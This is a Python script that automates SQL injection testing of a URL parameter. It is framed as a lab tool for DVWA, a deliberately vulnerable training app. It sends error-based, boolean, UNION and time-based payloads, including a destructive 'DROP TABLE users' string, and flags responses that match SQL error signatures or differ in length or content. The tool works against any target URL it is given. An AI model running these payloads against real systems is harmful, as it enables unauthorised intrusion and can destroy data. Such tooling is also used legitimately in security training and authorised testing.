#!/usr/bin/env python3
"""
sqli_orchestrator.py
Simple orchestrator for automated SQLi testing (controlled lab only).

Features:
- HTTP request module with retries and session
- Parameterized payload generator (error-based, boolean-based, union template)
- Response analyzer (error signature detection, boolean difference)
- Structured logging to console and JSONL file

Usage:
    python3 sqli_orchestrator.py --target "http://localhost:8080/vulnerabilities/sqli/?id={id}" --ids 1 2 3
"""

import requests
import argparse
import time
import json
import re
from copy import deepcopy
from typing import List, Dict, Any

# -------------------------
# Configuration / Constants
# -------------------------
TIMEOUT = 8               # seconds
RETRIES = 2
RESULTS_FILE = "sqli_results.jsonl"

# Common SQL error signatures (extendable)
SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",       # MySQL
    r"warning: mysql",                             # PHP/mysql
    r"unclosed quotation mark",                    # SQL Server
    r"syntax error at or near",                    # Postgres
    r"mysql_fetch",                                # PHP mysql fetch
    r"ORA-00933",                                  # Oracle
    r"SQL syntax.*?MySQL",                         # generic
]

# -------------------------
# Payload Generator
# -------------------------
class PayloadGenerator:
    def __init__(self):
        # Templates use {id} placeholder for numeric param, or we will inject into URL param
        self.error_payloads = [
            "'",
            "\"",
            "' OR 1=1 -- ",
            "' OR SLEEP(5) -- ",        # timing-based (simple)
            "'; DROP TABLE users; -- ", # obviously dangerous; do not use in real DBs (kept as example)
        ]
        self.boolean_payloads = [
            "' OR 1=1 -- ",
            "' OR 1=2 -- ",
            "\" OR \"1\"=\"1",
            "' AND 1=0 -- ",
        ]
        self.union_templates = [
            "' UNION SELECT NULL-- ",
            "' UNION SELECT 1,2,3-- ",
        ]

    def all_payloads(self) -> List[str]:
        # Combine and deduplicate
        out = list(dict.fromkeys(self.error_payloads + self.boolean_payloads + self.union_templates))
        return out

# -------------------------
# HTTP Client
# -------------------------
class HttpClient:
    def __init__(self, timeout=TIMEOUT, retries=RETRIES, headers=None):
        self.session = requests.Session()
        self.timeout = timeout
        self.retries = retries
        self.session.headers.update(headers or {
            "User-Agent": "Automated-SQLi-Orchestrator/1.0"
        })

    def get(self, url, params=None) -> requests.Response:
        attempt = 0
        while True:
            try:
                resp = self.session.get(url, params=params, timeout=self.timeout)
                return resp
            except requests.RequestException as e:
                attempt += 1
                if attempt > self.retries:
                    raise
                time.sleep(0.5)

# -------------------------
# Analyzer
# -------------------------
class Analyzer:
    def __init__(self):
        # compile regexes
        self.err_regexes = [re.compile(pat, re.IGNORECASE) for pat in SQL_ERROR_PATTERNS]

    def detect_error_based(self, text: str) -> Dict[str, Any]:
        for rx in self.err_regexes:
            if rx.search(text):
                return {"type": "error-based", "signature": rx.pattern}
        return {"type": None}

    def detect_boolean_based(self, original_text: str, mutated_text: str) -> Dict[str, Any]:
        # Very simple heuristic: compare lengths and presence/absence of keywords
        orig_len = len(original_text)
        mut_len = len(mutated_text)
        # If significant length difference -> probably boolean difference
        if abs(orig_len - mut_len) > max(20, 0.08 * orig_len):
            return {"type": "boolean-length-diff", "orig_len": orig_len, "mut_len": mut_len}
        # Compare presence of "Welcome" or "error" markers (DVWA shows 'You are in' or similar)
        # Generic: do a simple fuzzy check on top 5 words
        owords = set(re.findall(r"\w+", original_text.lower()) )
        mwords = set(re.findall(r"\w+", mutated_text.lower()) )
        if len(owords.symmetric_difference(mwords)) > 50:
            return {"type": "boolean-content-diff", "diff_count": len(owords.symmetric_difference(mwords))}
        return {"type": None}

# -------------------------
# Orchestrator
# -------------------------
class Orchestrator:
    def __init__(self, target_template: str, ids: List[str], client: HttpClient, generator: PayloadGenerator, analyzer: Analyzer):
        """
        target_template: e.g. "http://localhost:8080/vulnerabilities/sqli/?id={id}"
        ids: list of id values to test e.g. ['1','2']
        """
        self.target_template = target_template
        self.ids = ids
        self.client = client
        self.generator = generator
        self.analyzer = analyzer

    def run(self):
        payloads = self.generator.all_payloads()
        results = []
        for id_val in self.ids:
            base_url = self.target_template.format(id=id_val)
            print(f"\n[*] Testing parameter id={id_val} -> {base_url}")
            try:
                base_resp = self.client.get(base_url)
                base_text = base_resp.text
            except Exception as e:
                print(f"[!] Could not fetch base page for id={id_val}: {e}")
                continue

            for payload in payloads:
                # inject payload into id param by replacing the numeric part or appending
                # safest: craft URL with id param replaced
                injected_id = f"{id_val}{payload}"
                test_url = self.target_template.format(id=injected_id)
                time.sleep(0.15)  # small delay to avoid flooding
                try:
                    resp = self.client.get(test_url)
                    text = resp.text
                except Exception as e:
                    print(f"[!] Request failed for payload {payload!r}: {e}")
                    continue

                # Analyze response
                analysis = self.analyzer.detect_error_based(text)
                if analysis["type"]:
                    verdict = "POSSIBLE_SQLI (error-based)"
                else:
                    # boolean compare with base
                    bool_analysis = self.analyzer.detect_boolean_based(base_text, text)
                    if bool_analysis["type"]:
                        verdict = "POSSIBLE_SQLI (boolean-based)"
                    else:
                        verdict = "no-evidence"

                result_obj = {
                    "timestamp": time.time(),
                    "target": test_url,
                    "id_param": id_val,
                    "payload": payload,
                    "status_code": resp.status_code,
                    "verdict": verdict,
                    "details": analysis if analysis["type"] else bool_analysis
                }
                results.append(result_obj)
                # Print short summary
                if verdict != "no-evidence":
                    print(f"[+] {verdict} for id={id_val} payload={payload!r} (status={resp.status_code})")
                else:
                    print(f"[-] no evidence for payload={payload!r}", end="\r")

                # Append to file (streaming)
                with open(RESULTS_FILE, "a") as fh:
                    fh.write(json.dumps(result_obj) + "\n")

        return results

# -------------------------
# CLI / Main
# -------------------------
def parse_args():
    p = argparse.ArgumentParser(description="Simple SQLi orchestrator for DVWA (lab only).")
    p.add_argument("--target", required=True, help='Target URL template with {id}, e.g. "http://localhost:8080/vulnerabilities/sqli/?id={id}"')
    p.add_argument("--ids", required=True, nargs="+", help="List of id values to test (e.g. 1 2 3)")
    return p.parse_args()

def main():
    args = parse_args()

    # Basic validation
    if "{id}" not in args.target:
        print("[!] --target must include {id} placeholder")
        return

    client = HttpClient()
    gen = PayloadGenerator()
    analyzer = Analyzer()
    orchestrator = Orchestrator(args.target, args.ids, client, gen, analyzer)
    results = orchestrator.run()

    print("\n\n=== Summary ===")
    total = len(results)
    positives = [r for r in results if r["verdict"].startswith("POSSIBLE")]
    print(f"Tested payloads: {total}, Positive findings: {len(positives)}")
    for p in positives:
        print(f" * {p['verdict']} | id={p['id_param']} | payload={p['payload']} | status={p['status_code']}")

if __name__ == "__main__":
    main()
